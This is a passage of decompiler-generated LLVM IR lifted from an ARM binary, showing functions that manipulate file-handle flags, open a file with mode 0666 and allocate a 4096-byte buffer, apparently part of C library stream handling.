  %v2_d56c = and i32 %v1_d568, %v1_d564
  store i32 %v2_d56c, i32* %r3.global-to-local, align 4
  %v9_d570 = icmp eq i32 %v2_d56c, %v1_d564
  store i1 %v9_d570, i1* %cpsr_z.global-to-local, align 1
  %v1_d574 = load i32, i32* @r8, align 4
  %v2_d574 = add i32 %v1_d574, 4
  %v3_d574 = inttoptr i32 %v2_d574 to i32*
  store i32 %v0_d5ac, i32* %v3_d574, align 4
  br i1 %v9_d570, label %dec_label_pc_d57c, label %dec_label_pc_d4d0

dec_label_pc_d57c:                                ; preds = %dec_label_pc_d55c
  %v0_d57c = load i32, i32* @r4, align 4
  %v1_d57c = load i32, i32* @r6, align 4
  %v2_d57c = sub i32 -1, %v1_d57c
  %v3_d57c = and i32 %v0_d57c, %v2_d57c
  store i32 %v3_d57c, i32* %r3.global-to-local, align 4
  %v1_d580 = and i32 %v3_d57c, 1024
  %v2_d580 = icmp eq i32 %v1_d580, 0
  store i1 %v2_d580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d580, label %dec_label_pc_d5a0, label %dec_label_pc_d588

dec_label_pc_d588:                                ; preds = %dec_label_pc_d57c
  %v0_d588 = load i32, i32* @r5, align 4
  store i32 %v0_d588, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_d594 = call i32 @function_11158(i32 %v0_d588, i32 4)
  store i32 %v2_d594, i32* %r0.global-to-local, align 4
  %v2_d598 = icmp eq i32 %v2_d594, 0
  store i1 %v2_d598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d598, label %dec_label_pc_d588.dec_label_pc_d5a0_crit_edge, label %dec_label_pc_d4d0

dec_label_pc_d588.dec_label_pc_d5a0_crit_edge:    ; preds = %dec_label_pc_d588
  %v0_d5a0.pre = load i32, i32* @r6, align 4
  %v0_d5a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d5a0

dec_label_pc_d5a0:                                ; preds = %dec_label_pc_d588.dec_label_pc_d5a0_crit_edge, %dec_label_pc_d57c
  %v0_d5a4 = phi i32 [ %v0_d5a4.pre, %dec_label_pc_d588.dec_label_pc_d5a0_crit_edge ], [ %v0_d57c, %dec_label_pc_d57c ]
  %v0_d5a0 = phi i32 [ %v0_d5a0.pre, %dec_label_pc_d588.dec_label_pc_d5a0_crit_edge ], [ %v1_d57c, %dec_label_pc_d57c ]
  %v1_d5a0 = and i32 %v0_d5a0, 131072
  store i32 %v1_d5a0, i32* %r3.global-to-local, align 4
  %v2_d5a4 = or i32 %v1_d5a0, %v0_d5a4
  store i32 %v2_d5a4, i32* @r4, align 4
  br label %dec_label_pc_d5d0

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d554
  %v7_d5ac = icmp eq i32 %v0_d5ac, -1
  store i1 %v7_d5ac, i1* %cpsr_z.global-to-local, align 1
  %v0_d5b8.pre = load i32, i32* @r4, align 4
  br i1 %v7_d5ac, label %dec_label_pc_d5ac._crit_edge, label %bb35

bb35:                                             ; preds = %dec_label_pc_d5ac
  %v2_d5b0 = or i32 %v0_d5b8.pre, 131072
  store i32 %v2_d5b0, i32* @r4, align 4
  br label %dec_label_pc_d5ac._crit_edge

dec_label_pc_d5ac._crit_edge:                     ; preds = %dec_label_pc_d5ac, %bb35
  %v0_d5b8 = phi i32 [ %v2_d5b0, %bb35 ], [ %v0_d5b8.pre, %dec_label_pc_d5ac ]
  %v0_d5b4 = load i32, i32* @r6, align 4
  store i32 %v0_d5b4, i32* %r0.global-to-local, align 4
  store i32 %v0_d5b8, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_d5c0 = inttoptr i32 %v0_d5b4 to i8*
  %v3_d5c0 = call i32 @function_113a4(i8* %v2_d5c0, i32 %v0_d5b8)
  store i32 %v3_d5c0, i32* %r0.global-to-local, align 4
  %v1_d5c4 = icmp slt i32 %v3_d5c0, 0
  %v2_d5c4 = icmp eq i32 %v3_d5c0, 0
  store i1 %v2_d5c4, i1* %cpsr_z.global-to-local, align 1
  %v1_d5c8 = load i32, i32* @r8, align 4
  %v2_d5c8 = add i32 %v1_d5c8, 4
  %v3_d5c8 = inttoptr i32 %v2_d5c8 to i32*
  store i32 %v3_d5c0, i32* %v3_d5c8, align 4
  br i1 %v1_d5c4, label %dec_label_pc_d4e4, label %dec_label_pc_d5d0

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d5ac._crit_edge, %dec_label_pc_d5a0
  %v0_d5d0 = load i32, i32* @r8, align 4
  %v1_d5d0 = inttoptr i32 %v0_d5d0 to i32*
  %v2_d5d0 = load i32, i32* %v1_d5d0, align 4
  %v1_d5d4 = and i32 %v2_d5d0, 8192
  store i32 %v1_d5d4, i32* %r3.global-to-local, align 4
  %v3_d5d81 = udiv i32 %v1_d5d4, 256
  store i32 %v3_d5d81, i32* %r2.global-to-local, align 4
  %v1_d5dc = trunc i32 %v3_d5d81 to i8
  %v3_d5dc = add i32 %v0_d5d0, 1
  %v4_d5dc = inttoptr i32 %v3_d5dc to i8*
  store i8 %v1_d5dc, i8* %v4_d5dc, align 1
  %v0_d5e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d5e0 = trunc i32 %v0_d5e0 to i8
  %v2_d5e0 = load i32, i32* @r8, align 4
  %v3_d5e0 = inttoptr i32 %v2_d5e0 to i8*
  store i8 %v1_d5e0, i8* %v3_d5e0, align 1
  %v0_d5e4 = load i32, i32* @r4, align 4
  %v1_d5e4 = and i32 %v0_d5e4, 131072
  store i32 %v1_d5e4, i32* %r1.global-to-local, align 4
  %v2_d5e4 = icmp eq i32 %v1_d5e4, 0
  store i1 %v2_d5e4, i1* %cpsr_z.global-to-local, align 1
  %v0_d5e8 = load i32, i32* @r8, align 4
  %v1_d5e8 = add i32 %v0_d5e8, 1
  %v2_d5e8 = inttoptr i32 %v1_d5e8 to i8*
  %v3_d5e8 = load i8, i8* %v2_d5e8, align 1
  %v4_d5e8 = zext i8 %v3_d5e8 to i32
  store i32 %v4_d5e8, i32* @ip, align 4
  %v1_d5ec = inttoptr i32 %v0_d5e8 to i8*
  %v2_d5ec = load i8, i8* %v1_d5ec, align 1
  %v3_d5ec = zext i8 %v2_d5ec to i32
  store i32 %v3_d5ec, i32* %r3.global-to-local, align 4
  br i1 %v2_d5e4, label %bb37, label %bb36

bb36:                                             ; preds = %dec_label_pc_d5d0
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_d5d0, %bb36
  %v0_d600 = phi i32 [ 0, %dec_label_pc_d5d0 ], [ 32768, %bb36 ]
  %v1_d5f4 = and i32 %v0_d5e4, 1024
  store i32 %v1_d5f4, i32* %r0.global-to-local, align 4
  %v4_d5fc = mul nuw nsw i32 %v4_d5e8, 256
  %v5_d5fc = or i32 %v3_d5ec, %v4_d5fc
  %v2_d600 = or i32 %v0_d600, %v1_d5f4
  store i32 %v2_d600, i32* %r1.global-to-local, align 4
  %v2_d608 = or i32 %v5_d5fc, %v2_d600
  %v1_d5f8 = mul i32 %v0_d5e4, 16
  %v1_d604 = and i32 %v1_d5f8, 48
  %v1_d60c = add nuw nsw i32 %v1_d604, 16
  %v4_d610 = xor i32 %v1_d60c, 48
  %v5_d610 = or i32 %v2_d608, %v4_d610
  store i32 %v5_d610, i32* %r3.global-to-local, align 4
  %v3_d61419 = udiv i32 %v2_d608, 256
  store i32 %v3_d61419, i32* %r2.global-to-local, align 4
  %v1_d618 = trunc i32 %v3_d61419 to i8
  store i8 %v1_d618, i8* %v2_d5e8, align 1
  %v0_d61c = load i32, i32* %r3.global-to-local, align 4
  %v1_d61c = trunc i32 %v0_d61c to i8
  %v2_d61c = load i32, i32* @r8, align 4
  %v3_d61c = inttoptr i32 %v2_d61c to i8*
  store i8 %v1_d61c, i8* %v3_d61c, align 1
  %v0_d620 = call i32 @function_cec4()
  store i32 %v0_d620, i32* %r0.global-to-local, align 4
  %v0_d624 = load i32, i32* @r8, align 4
  %v1_d624 = add i32 %v0_d624, 1
  %v2_d624 = inttoptr i32 %v1_d624 to i8*
  %v3_d624 = load i8, i8* %v2_d624, align 1
  %v4_d624 = zext i8 %v3_d624 to i32
  store i32 %v4_d624, i32* @r3, align 4
  %v1_d628 = inttoptr i32 %v0_d624 to i8*
  %v2_d628 = load i8, i8* %v1_d628, align 1
  %v3_d628 = zext i8 %v2_d628 to i32
  store i32 %v0_d620, i32* @r6, align 4
  %v1_d630 = add i32 %v0_d624, 4
  %v2_d630 = inttoptr i32 %v1_d630 to i32*
  %v3_d630 = load i32, i32* %v2_d630, align 4
  store i32 %v3_d630, i32* @r0, align 4
  %v4_d634 = mul nuw nsw i32 %v4_d624, 256
  %v5_d634 = or i32 %v3_d628, %v4_d634
  store i32 %v5_d634, i32* @r4, align 4
  %v1_d638 = inttoptr i32 %v0_d620 to i32*
  %v2_d638 = load i32, i32* %v1_d638, align 4
  store i32 %v2_d638, i32* @r5, align 4
  %v1_d63c = call i32 @function_f51c(i32 %v3_d630)
  store i32 %v1_d63c, i32* %r0.global-to-local, align 4
  %v0_d640 = load i32, i32* @r4, align 4
  %v4_d640 = mul i32 %v1_d63c, 256
  %v5_d640 = or i32 %v0_d640, %v4_d640
  store i32 %v5_d640, i32* @r4, align 4
  %v3_d644 = sdiv i32 %v5_d640, 256
  store i32 %v3_d644, i32* %r3.global-to-local, align 4
  %v1_d648 = trunc i32 %v3_d644 to i8
  %v2_d648 = load i32, i32* @r8, align 4
  %v3_d648 = add i32 %v2_d648, 1
  %v4_d648 = inttoptr i32 %v3_d648 to i8*
  store i8 %v1_d648, i8* %v4_d648, align 1
  %v0_d64c = load i32, i32* @r4, align 4
  %v1_d64c = trunc i32 %v0_d64c to i8
  %v2_d64c = load i32, i32* @r8, align 4
  %v3_d64c = inttoptr i32 %v2_d64c to i8*
  store i8 %v1_d64c, i8* %v3_d64c, align 1
  %v0_d650 = load i32, i32* @r5, align 4
  %v1_d650 = load i32, i32* @r6, align 4
  %v2_d650 = inttoptr i32 %v1_d650 to i32*
  store i32 %v0_d650, i32* %v2_d650, align 4
  %v0_d654 = load i32, i32* @r8, align 4
  %v1_d654 = add i32 %v0_d654, 8
  %v2_d654 = inttoptr i32 %v1_d654 to i32*
  %v3_d654 = load i32, i32* %v2_d654, align 4
  store i32 %v3_d654, i32* %r3.global-to-local, align 4
  %v2_d658 = icmp eq i32 %v3_d654, 0
  store i1 %v2_d658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d658, label %dec_label_pc_d660, label %bb38

dec_label_pc_d660:                                ; preds = %bb37
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_d664 = call i32 @function_fc78(i32 4096)
  store i32 %v1_d664, i32* %r0.global-to-local, align 4
  %v2_d668 = icmp eq i32 %v1_d664, 0
  store i1 %v2_d668, i1* %cpsr_z.global-to-local, align 1
  %v1_d67c.pre = load i32, i32* @r8, align 4
  br i1 %v2_d668, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_d660
  %v2_d67c20 = add i32 %v1_d67c.pre, 8
  %v3_d67c21 = inttoptr i32 %v2_d67c20 to i32*
  store i32 0, i32* %v3_d67c21, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_d660
  %v2_d66c = inttoptr i32 %v1_d67c.pre to i32*
  %v3_d66c = load i32, i32* %v2_d66c, align 4
  %v2_d670 = or i32 %v3_d66c, 16384
  store i32 %v2_d670, i32* %r3.global-to-local, align 4
  %v2_d674 = add i32 %v1_d664, 4096
  store i32 %v2_d674, i32* %r2.global-to-local, align 4
  %v4_d678 = sdiv i32 %v2_d670, 256
  store i32 %v4_d678, i32* %r1.global-to-local, align 4
  %v2_d67c = add i32 %v1_d67c.pre, 8
  %v3_d67c = inttoptr i32 %v2_d67c to i32*
  store i32 %v1_d664, i32* %v3_d67c, align 4
  %v1_d680 = load i32, i32* %r2.global-to-local, align 4
  %v2_d680 = load i32, i32* @r8, align 4
  %v3_d680 = add i32 %v2_d680, 12
  %v4_d680 = inttoptr i32 %v3_d680 to i32*
  store i32 %v1_d680, i32* %v4_d680, align 4
  %v1_d684 = load i32, i32* %r1.global-to-local, align 4
  %v2_d684 = trunc i32 %v1_d684 to i8
  %v3_d684 = load i32, i32* @r8, align 4
  %v4_d684 = add i32 %v3_d684, 1
  %v5_d684 = inttoptr i32 %v4_d684 to i8*
  store i8 %v2_d684, i8* %v5_d684, align 1
  %v0_d688.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d688.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_d688 = load i32, i32* %r3.global-to-local, align 4
  %v2_d688 = trunc i32 %v1_d688 to i8
  %v3_d688 = load i32, i32* @r8, align 4
  %v4_d688 = inttoptr i32 %v3_d688 to i8*
  store i8 %v2_d688, i8* %v4_d688, align 1
  %v0_d68c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d68c.pr.pr, label %.thread10, label %bb38

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_d68c = load i32, i32* @r8, align 4
  %v3_d68c = add i32 %v2_d68c, 12
  %v4_d68c = inttoptr i32 %v3_d68c to i32*
  store i32 %v1_d664, i32* %v4_d68c, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20308.320 to i32), i32* %r3.global-to-local, align 4
  %v2_d698 = load i32, i32* @r8, align 4
  %v3_d698 = add i32 %v2_d698, 2
  %v4_d698 = inttoptr i32 %v3_d698 to i8*
  store i8 0, i8* %v4_d698, align 1
  %v0_d69c = load i32, i32* @r8, align 4
  %v1_d69c = add i32 %v0_d69c, 1
  %v2_d69c = inttoptr i32 %v1_d69c to i8*
  %v3_d69c = load i8, i8* %v2_d69c, align 1
  %v4_d69c = zext i8 %v3_d69c to i32
  store i32 %v4_d69c, i32* %r2.global-to-local, align 4
  %v2_d6a0 = load i32, i32* @global_var_20308.320, align 4
  store i32 %v2_d6a0, i32* %r1.global-to-local, align 4
  %v1_d6a4 = add i32 %v0_d69c, 8
  %v2_d6a4 = inttoptr i32 %v1_d6a4 to i32*
  %v3_d6a4 = load i32, i32* %v2_d6a4, align 4
  store i32 %v3_d6a4, i32* %r3.global-to-local, align 4
  %v1_d6a8 = and i32 %v4_d69c, 32
  %v2_d6a8 = icmp eq i32 %v1_d6a8, 0
  store i1 %v2_d6a8, i1* %cpsr_z.global-to-local, align 1
  %v2_d6ac = add i32 %v0_d69c, 20
  %v3_d6ac = inttoptr i32 %v2_d6ac to i32*
  store i32 %v3_d6a4, i32* %v3_d6ac, align 4
  %v0_d6b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_d6b0 = load i32, i32* @r8, align 4
  %v2_d6b0 = add i32 %v1_d6b0, 44
  %v3_d6b0 = inttoptr i32 %v2_d6b0 to i32*
  store i32 %v0_d6b0, i32* %v3_d6b0, align 4
  %v0_d6b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d6b4 = load i32, i32* @r8, align 4
  %v2_d6b4 = add i32 %v1_d6b4, 52
  %v3_d6b4 = inttoptr i32 %v2_d6b4 to i32*
  store i32 %v0_d6b4, i32* %v3_d6b4, align 4
  %v0_d6b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d6b8 = load i32, i32* @r8, align 4
  %v2_d6b8 = add i32 %v1_d6b8, 24
  %v3_d6b8 = inttoptr i32 %v2_d6b8 to i32*
  store i32 %v0_d6b8, i32* %v3_d6b8, align 4
  %v0_d6bc = load i32, i32* %r3.global-to-local, align 4
  %v1_d6bc = load i32, i32* @r8, align 4
  %v2_d6bc = add i32 %v1_d6bc, 28
  %v3_d6bc = inttoptr i32 %v2_d6bc to i32*
  store i32 %v0_d6bc, i32* %v3_d6bc, align 4
  %v0_d6c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d6c0 = load i32, i32* @r8, align 4
  %v2_d6c0 = add i32 %v1_d6c0, 16
  %v3_d6c0 = inttoptr i32 %v2_d6c0 to i32*
  store i32 %v0_d6c0, i32* %v3_d6c0, align 4
  br i1 %v2_d6a8, label %dec_label_pc_d754, label %dec_label_pc_d6c8

dec_label_pc_d6c8:                                ; preds = %bb38
  %v2_d6c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_d6c8, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_202f0.287 to i32), i32* %r2.global-to-local, align 4
  %v1_d6e0 = call i32 @function_10d54()
  store i32 ptrtoint (i32* @global_var_202f0.287 to i32), i32* %r0.global-to-local, align 4
  %v1_d6f0 = call i32 @function_10d4c()
  store i32 ptrtoint (i32* @global_var_202d8.326 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_d4a4, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r1.global-to-local, align 4
  %v1_d704 = call i32 @function_10d54()
  store i32 ptrtoint (i32* @global_var_202d8.326 to i32), i32* %r0.global-to-local, align 4
  %v1_d710 = call i32 @function_10d4c()
  store i32 ptrtoint (i32** @global_var_202d4.329 to i32), i32* %r2.global-to-local, align 4
  %v2_d718 = load i32, i32* bitcast (i32** @global_var_202d4.329 to i32*), align 4
  store i32 %v2_d718, i32* %r3.global-to-local, align 4
  store i32 %v2_d4a4, i32* @r0, align 4
  %v1_d720 = load i32, i32* @r8, align 4
  %v2_d720 = add i32 %v1_d720, 32
  %v3_d720 = inttoptr i32 %v2_d720 to i32*
  store i32 %v2_d718, i32* %v3_d720, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d72c = load i32, i32* @r8, align 4
  %v1_d72c = load i32, i32* %r2.global-to-local, align 4
  %v2_d72c = inttoptr i32 %v1_d72c to i32*
  store i32 %v0_d72c, i32* %v2_d72c, align 4
  %v1_d734 = call i32 @function_10d54()
  store i32 %v2_d6c8, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 55116, i32* @lr, align 4
  %v1_d748 = call i32 @function_10d54()
  store i32 %v1_d748, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d754

dec_label_pc_d750:                                ; preds = %dec_label_pc_d4e4, %dec_label_pc_d4d0, %dec_label_pc_d4f0
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_d754

dec_label_pc_d754:                                ; preds = %bb38, %dec_label_pc_d528, %dec_label_pc_d6c8, %dec_label_pc_d750
  %v0_d754 = load i32, i32* @r8, align 4
  store i32 %v0_d754, i32* %r0.global-to-local, align 4
  %v2_d75c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d75c, i32* @r4, align 4
  store i32 %v6_d498, i32* @r5, align 4
  store i32 %v9_d498, i32* @r6, align 4
  store i32 %v15_d498, i32* @r8, align 4
  ret i32 %v0_d754

; uselistorder directives
  uselistorder i32 %v1_d67c.pre, { 1, 0, 2 }
  uselistorder i32 %v1_d664, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_d644, { 1, 0 }
  uselistorder i32 %v3_d5d81, { 1, 0 }
  uselistorder i32 %v0_d5b8, { 1, 0 }
  uselistorder i1 %v7_d5ac, { 1, 0 }
  uselistorder i32 %v1_d57c, { 1, 0 }
  uselistorder i32 %v0_d57c, { 1, 0 }
  uselistorder i32 %v1_d564, { 1, 0, 2 }
  uselistorder i32 %v1_d518, { 1, 0 }
  uselistorder i1 %v7_d4c4, { 1, 0 }
  uselistorder i1 %v7_d4b8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 16, 15, 18, 17, 2, 1, 19, 3, 20, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 8, 9 }
  uselistorder i8 114, { 1, 0 }
  uselistorder label %dec_label_pc_d754, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d750, { 2, 0, 1 }
  uselistorder label %bb38, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb37, { 1, 0 }
  uselistorder label %dec_label_pc_d5ac._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_d554, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_d500, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d4d0, { 1, 2, 0 }
}

define i32 @function_d760(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d760:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_d760 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d760, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_d760
  %v3_d768 = and i32 %arg4, %arg3
  store i32 %v3_d768, i32* %r0.global-to-local, align 4
  %v2_d76c = trunc i32 %v3_d768 to i16
  %v4_d76c = inttoptr i32 %v3_d768 to i16*
  store i16 %v2_d76c, i16* %v4_d76c, align 2
  %v5_d76c = load i32, i32* @r6, align 4
  %v6_d76c = load i32, i32* %r0.global-to-local, align 4
  %v7_d76c = sub i32 %v6_d76c, %v5_d76c
  store i32 %v7_d76c, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_d760, %bb
  %v8_d76c = phi i32 [ %tmp, %dec_label_pc_d760 ], [ %v7_d76c, %bb ]
  ret i32 %v8_d76c

; uselistorder directives
  uselistorder i32 %v3_d768, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_d790() local_unnamed_addr {
dec_label_pc_d790:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d790 = load i32, i32* @r4, align 4
  store i32 %v3_d790, i32* %stack_var_-24, align 4
  %v9_d790 = load i32, i32* @r6, align 4
  %v0_d794 = call i32 @function_cec4()
  store i32 ptrtoint (i8** @global_var_2030c.277 to i32), i32* @r4, align 4
  %v3_d79c = load i8, i8* @global_var_2030d.332, align 1
  %v4_d79c = zext i8 %v3_d79c to i32
  store i32 %v4_d79c, i32* @r3, align 4
  %v2_d7a0 = load i8, i8* bitcast (i8** @global_var_2030c.277 to i8*), align 4
  %v3_d7a0 = zext i8 %v2_d7a0 to i32
  store i32 %v0_d794, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_d7ac = mul nuw nsw i32 %v4_d79c, 256
  %v5_d7ac = or i32 %v3_d7a0, %v4_d7ac
  store i32 %v5_d7ac, i32* @r6, align 4
  %v1_d7b0 = inttoptr i32 %v0_d794 to i32*
  %v2_d7b0 = load i32, i32* %v1_d7b0, align 4
  store i32 %v2_d7b0, i32* %r8.global-to-local, align 4
  %v1_d7b4 = call i32 @function_f51c(i32 0)
  %v1_d7b8 = sub i32 1, %v1_d7b4
  %v0_d7bc = load i32, i32* @r6, align 4
  %v4_d7bc = mul i32 %v1_d7b8, 256
  %v5_d7bc = xor i32 %v4_d7bc, %v0_d7bc
  %v3_d7c0 = load i8, i8* @global_var_2035d.333, align 1
  %v4_d7c0 = zext i8 %v3_d7c0 to i32
  store i32 %v4_d7c0, i32* @r3, align 4
  %v3_d7c4 = load i8, i8* @global_var_2035c.278, align 1
  %v4_d7c4 = zext i8 %v3_d7c4 to i32
  %v3_d7c8 = sdiv i32 %v5_d7bc, 256
  store i32 1, i32* @r0, align 4
  %v4_d7d0 = mul nuw nsw i32 %v4_d7c0, 256
  %v5_d7d0 = or i32 %v4_d7c4, %v4_d7d0
  store i32 %v5_d7d0, i32* @r5, align 4
  %v1_d7d4 = trunc i32 %v3_d7c8 to i8
  store i8 %v1_d7d4, i8* @global_var_2030d.332, align 1
  %v1_d7d8 = trunc i32 %v0_d7bc to i8
  %v2_d7d8 = load i32, i32* @r4, align 4
  %v3_d7d8 = inttoptr i32 %v2_d7d8 to i8*
  store i8 %v1_d7d8, i8* %v3_d7d8, align 1
  %v1_d7dc = call i32 @function_f51c(i32 1)
  %v1_d7e0 = sub i32 1, %v1_d7dc
  %v0_d7e4 = load i32, i32* @r5, align 4
  %v4_d7e4 = mul i32 %v1_d7e0, 256
  %v5_d7e4 = xor i32 %v4_d7e4, %v0_d7e4
  store i32 %v5_d7e4, i32* %r5.global-to-local, align 4
  %v3_d7e8 = sdiv i32 %v5_d7e4, 256
  %v1_d7ec = trunc i32 %v3_d7e8 to i8
  store i8 %v1_d7ec, i8* @global_var_2035d.333, align 1
  %v0_d7f0 = load i32, i32* %r8.global-to-local, align 4
  %v1_d7f0 = load i32, i32* @r7, align 4
  %v2_d7f0 = inttoptr i32 %v1_d7f0 to i32*
  store i32 %v0_d7f0, i32* %v2_d7f0, align 4
  %v0_d7f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_d7f4 = trunc i32 %v0_d7f4 to i8
  store i8 %v1_d7f4, i8* @global_var_2035c.278, align 1
  %v2_d7f8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d7f8, i32* @r4, align 4
  store i32 %v9_d790, i32* @r6, align 4
  ret i32 %v1_d7e0

; uselistorder directives
  uselistorder i32 %v1_d7e0, { 1, 0 }
  uselistorder i32 %v0_d7bc, { 1, 0 }
  uselistorder i8* @global_var_2035c.278, { 1, 0 }
  uselistorder i8* @global_var_2035d.333, { 1, 0 }
  uselistorder i32 (i32)* @function_f51c, { 1, 0, 2 }
  uselistorder i8* @global_var_2030d.332, { 1, 0 }
}

define i32 @function_d800() local_unnamed_addr {
dec_label_pc_d800:
  store i32 ptrtoint (i32* @global_var_16e6c.335 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_d808 = call i32 @function_ef60()
  %v0_d80c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d80c, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_d800
  %v1_d80c = load i32, i32* @r1, align 4
  %v2_d80c = load i32, i32* @ip, align 4
  %v3_d80c = udiv i32 %v2_d80c, 268435456
  %v4_d80c = mul i32 %v2_d80c, 16
  %v5_d80c = or i32 %v3_d80c, %v4_d80c
  %v8_d80c = and i32 %v5_d80c, %v1_d80c
  store i32 %v8_d80c, i32* @r6, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_d800, %bb
  ret i32 %v0_d808

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_d810() local_unnamed_addr {
dec_label_pc_d810:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_d810 = load i32, i32* @r4, align 4
  store i32 %v3_d810, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_202d8.326 to i32), i32* @r0, align 4
  %v0_d818 = call i32 @function_d800()
  store i32 ptrtoint (i32* @global_var_202f0.287 to i32), i32* @r0, align 4
  %v0_d820 = call i32 @function_d800()
  store i32 ptrtoint (i32** @global_var_202d4.329 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_202d4.329 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_d87c6 = add i32 %storemerge5, 56
  store i32 %v1_d87c6, i32* @r5, align 4
  %v2_d8808 = icmp eq i32 %storemerge5, 0
  store i32 %v1_d87c6, i32* %r0.global-to-local, align 4
  br i1 %v2_d8808, label %dec_label_pc_d88c, label %dec_label_pc_d830

dec_label_pc_d830:                                ; preds = %dec_label_pc_d810, %dec_label_pc_d86c
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  store i32 55356, i32* @lr, align 4
  %v1_d838 = call i32 @function_10d4c()
  %v2_d83c = icmp eq i32 %v1_d838, 0
  %v0_d840 = load i32, i32* @r5, align 4
  store i32 %v0_d840, i32* @r0, align 4
  br i1 %v2_d83c, label %dec_label_pc_d86c, label %dec_label_pc_d848

dec_label_pc_d848:                                ; preds = %dec_label_pc_d830
  %v0_d848 = load i32, i32* @r4, align 4
  %v1_d848 = add i32 %v0_d848, 8
  %v2_d848 = inttoptr i32 %v1_d848 to i32*
  %v3_d848 = load i32, i32* %v2_d848, align 4
  store i32 %v3_d848, i32* %r3.global-to-local, align 4
  %v3_d850 = inttoptr i32 %v0_d848 to i8*
  store i8 48, i8* %v3_d850, align 1
  %v2_d858 = load i32, i32* @r4, align 4
  %v3_d858 = add i32 %v2_d858, 1
  %v4_d858 = inttoptr i32 %v3_d858 to i8*
  store i8 0, i8* %v4_d858, align 1
  %v0_d85c = load i32, i32* %r3.global-to-local, align 4
  %v1_d85c = load i32, i32* @r4, align 4
  %v2_d85c = add i32 %v1_d85c, 20
  %v3_d85c = inttoptr i32 %v2_d85c to i32*
  store i32 %v0_d85c, i32* %v3_d85c, align 4
